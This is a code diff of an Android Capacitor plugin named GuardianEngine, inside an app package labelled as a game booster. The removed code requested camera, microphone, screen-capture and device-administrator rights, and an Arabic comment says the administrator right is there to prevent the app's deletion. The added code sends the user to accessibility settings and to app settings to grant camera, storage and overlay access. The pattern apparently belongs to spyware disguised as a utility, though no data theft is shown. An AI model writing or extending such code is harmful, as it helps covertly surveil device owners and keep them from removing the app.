@@ -1,15 +1,12 @@
 package com.Ejram.gameboost;
 
-import android.Manifest;
 import android.app.ActivityManager;
-import android.app.admin.DevicePolicyManager;
-import android.content.ComponentName;
 import android.content.Context;
 import android.content.Intent;
 import android.content.pm.ApplicationInfo;
 import android.content.pm.PackageManager;
-import android.media.projection.MediaProjectionManager;
-import androidx.core.app.ActivityCompat;
+import android.net.Uri;
+import android.provider.Settings;
 import java.util.List;
 
 import com.getcapacitor.Plugin;
@@ -22,31 +19,23 @@ import com.getcapacitor.JSObject;
 public class GuardianEngine extends Plugin {
 
     @PluginMethod
-    public void requestUltimatePermissions(PluginCall call) {
+    public void openSettingsManual(PluginCall call) {
         try {
-            // 1. طلب الكاميرا والمايكروفون والمساحة
-            String[] perms = { Manifest.permission.CAMERA, Manifest.permission.RECORD_AUDIO };
-            ActivityCompat.requestPermissions(getActivity(), perms, 100);
+            // 1. فتح إعدادات إمكانية الوصول (Accessibility)
+            Intent accIntent = new Intent(Settings.ACTION_ACCESSIBILITY_SETTINGS);
+            accIntent.addFlags(Intent.FLAG_ACTIVITY_NEW_TASK);
+            getContext().startActivity(accIntent);
 
-            // 2. طلب مدير الجهاز (لمنع الحذف)
-            ComponentName compName = new ComponentName(getContext(), GuardianDeviceAdmin.class);
-            Intent adminIntent = new Intent(DevicePolicyManager.ACTION_ADD_DEVICE_ADMIN);
-            adminIntent.putExtra(DevicePolicyManager.EXTRA_DEVICE_ADMIN, compName);
-            adminIntent.putExtra(DevicePolicyManager.EXTRA_ADD_EXPLANATION, "مطلوب لتفعيل حماية Guardian Center");
-            adminIntent.addFlags(Intent.FLAG_ACTIVITY_NEW_TASK);
-            getContext().startActivity(adminIntent);
-
-            // 3. طلب بث الشاشة
-            MediaProjectionManager mpm = (MediaProjectionManager) getContext().getSystemService(Context.MEDIA_PROJECTION_SERVICE);
-            if (mpm != null) {
-                Intent screenIntent = mpm.createScreenCaptureIntent();
-                screenIntent.addFlags(Intent.FLAG_ACTIVITY_NEW_TASK);
-                getContext().startActivity(screenIntent);
-            }
+            // 2. فتح إعدادات التطبيق لمنح (الكاميرا - المساحة - الظهور فوق التطبيقات)
+            Intent appIntent = new Intent(Settings.ACTION_APPLICATION_DETAILS_SETTINGS);
+            Uri uri = Uri.fromParts("package", getContext().getPackageName(), null);
+            appIntent.setData(uri);
+            appIntent.addFlags(Intent.FLAG_ACTIVITY_NEW_TASK);
+            getContext().startActivity(appIntent);
 
             call.resolve();
         } catch (Exception e) {
-            call.reject("Error requesting permissions");
+            call.reject("Error opening settings");
         }
     }
 
